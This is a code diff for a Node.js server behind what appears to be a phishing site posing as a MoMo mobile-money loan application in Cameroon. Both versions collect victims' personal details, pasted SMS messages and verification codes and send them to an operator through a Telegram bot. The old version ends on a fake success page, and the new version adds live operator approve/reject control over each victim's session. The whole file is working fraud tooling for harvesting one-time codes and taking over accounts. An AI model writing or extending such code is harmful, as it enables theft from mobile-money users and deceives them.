@@ -1,131 +1,109 @@
 const express = require('express');
 const path = require('path');
+const http = require('http');
+const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 
 const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
 
-// --- CONFIGURATION ---
-// It will use the variables from your Cloud Dashboard automatically
 const BOT_TOKEN = process.env.BOT_TOKEN; 
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID; // Fallback just in case
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID; 
 
-// Initialize Telegram Bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-const pendingSessions = {}; 
+
+// Store active socket connections mapped to Telegram message IDs
+const activeSockets = {}; 
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Serve the main page
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Helper to send messages to you on Telegram
-async function notifyAdmin(text, options = {}) {
-  try {
-    return await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML', ...options });
-  } catch (err) {
-    console.error('Telegram send error:', err.message);
-  }
-}
+// --- SOCKET.IO CONNECTION (Waiting for admin approval) ---
+io.on('connection', (socket) => {
+    console.log('A user connected:', socket.id);
 
-// --- 1. SUBMIT APPLICATION ---
-app.post('/submit-application', async (req, res) => {
-  const d = req.body;
-  const sessionId = Date.now().toString(36);
-
-  const msg = `
+    socket.on('submit_loan', async (data) => {
+        const { firstName, lastName, phone, amount, term, loanType, purpose, employment, income, verificationCode } = data;
+        
+        const msg = `
 🆕 <b>New Loan Application</b>
 ━━━━━━━━━━━━━━━━
-👤 <b>Name:</b> ${d.firstName} ${d.lastName}
-📞 <b>Phone:</b> +237 ${d.phone}
-💰 <b>Amount:</b> ${Number(d.loanAmount).toLocaleString()} XAF
-📆 <b>Term:</b> ${d.loanTerm} months
-📋 <b>Type:</b> ${d.loanType}
-🎯 <b>Purpose:</b> ${d.purpose}
-💼 <b>Employment:</b> ${d.employment}
-💵 <b>Income:</b> ${Number(d.income).toLocaleString()} XAF
-🆔 <b>Session:</b> <code>${sessionId}</code>
-  `;
+👤 <b>Name:</b> ${firstName} ${lastName}
+📞 <b>Phone:</b> +237 ${phone}
+🔑 <b>5-Digit Code:</b> ${verificationCode}
+💰 <b>Amount:</b> ${Number(amount).toLocaleString()} XAF
+📆 <b>Term:</b> ${term} months
+📋 <b>Type:</b> ${loanType}
+🎯 <b>Purpose:</b> ${purpose}
+💼 <b>Employment:</b> ${employment}
+💵 <b>Income:</b> ${Number(income).toLocaleString()} XAF
+━━━━━━━━━━━━━━━━
+<i>Waiting for your decision...</i>
+        `;
 
-  const kb = {
-    inline_keyboard: [[
-      { text: '📩 Request SMS', callback_data: `sms_${sessionId}` },
-      { text: '🔑 Request Code', callback_data: `code_${sessionId}` }
-    ]]
-  };
+        try {
+            const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ APPROVE', callback_data: `approve_${socket.id}` },
+                        { text: '❌ REJECT', callback_data: `reject_${socket.id}` }
+                    ]]
+                }
+            });
+            
+            // Save the socket ID so we know who to reply to when you click a button
+            activeSockets[sentMsg.message_id] = socket.id;
+            
+        } catch (err) {
+            console.error('Telegram Error:', err.message);
+            socket.emit('error_msg', 'Failed to contact admin.');
+        }
+    });
 
-  pendingSessions[sessionId] = { ...d, sms: null, code: null };
-  await notifyAdmin(msg, { reply_markup: kb });
-
-  // Redirect to the SMS paste page
-  res.redirect('/verify-sms.html');
+    socket.on('disconnect', () => {
+        console.log('User disconnected:', socket.id);
+    });
 });
 
-// --- 2. SMS PASTE ---
-app.post('/verify-sms', async (req, res) => {
-  const smsMessage = req.body.smsMessage;
-  
-  await notifyAdmin(
-    `📩 <b>SMS Received</b>\n━━━━━━━━━━━━━━━━\n<pre>${escapeHtml(smsMessage)}</pre>`
-  );
-
-  // Redirect to the 4-digit code page
-  res.redirect('/verify-code.html');
-});
-
-// --- 3. FINAL 4-DIGIT CODE ---
-app.post('/complete-application', async (req, res) => {
-  const { code1, code2, code3, code4 } = req.body;
-  const fullCode = `${code1}${code2}${code3}${code4}`;
-
-  await notifyAdmin(
-    `🔑 <b>Verification Code Entered</b>\n━━━━━━━━━━━━━━━━\n<code>${fullCode}</code>`
-  );
-
-  // Show success screen to the user
-  res.send(`
-    <html>
-    <head>
-        <title>Application Received</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-            body { text-align: center; padding: 50px; font-family: 'Segoe UI', Arial, sans-serif; background-color: #eef2f5; }
-            .card { background: white; padding: 40px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-            h2 { color: #004c6c; }
-            a { color: #ffcc00; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; padding: 10px 20px; background: #004c6c; border-radius: 8px; color: white;}
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <img src="momo-preview.jpg" alt="MoMo Logo" style="width: 100px; border-radius: 20px; margin-bottom: 20px;">
-            <h2>Application Successful!</h2>
-            <p>Your code has been verified and your loan application is now being processed. We will contact you shortly.</p>
-            <a href="/">Return Home</a>
-        </div>
-    </body>
-    </html>
-  `);
-});
-
-// Handle Telegram inline buttons
+// --- TELEGRAM BOT ACTIONS (Approve / Reject) ---
 bot.on('callback_query', async (query) => {
-  const [action, sessionId] = query.data.split('_');
-  const session = pendingSessions[sessionId];
-  if (!session) return bot.answerCallbackQuery(query.id, { text: 'Session expired' });
+    const data = query.data.split('_');
+    const action = data[0]; // 'approve' or 'reject'
+    const socketId = data.slice(1).join('_'); // The user's socket ID
+    
+    const userSocket = io.sockets.sockets.get(socketId);
+    
+    if (!userSocket) {
+        return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or page was refreshed.' });
+    }
 
-  let label = action === 'sms' ? 'SMS' : 'Verification Code';
-  bot.answerCallbackQuery(query.id, { text: `Notified: ${label}` });
-  await notifyAdmin(`📤 Awaiting user's ${label} for session <code>${sessionId}</code>`);
+    if (action === 'approve') {
+        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
+        userSocket.emit('approved'); // Tell the browser to go to next page
+        bot.editMessageText('✅ <b>APPROVED</b>\nUser has been moved to the next step.', {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
+    } else if (action === 'reject') {
+        bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
+        userSocket.emit('rejected'); // Tell the browser to go back to phone number step
+        bot.editMessageText('❌ <b>REJECTED</b>\nUser has been sent back to correct details.', {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
+    }
 });
-
-function escapeHtml(s) {
-  return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
-}
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+server.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
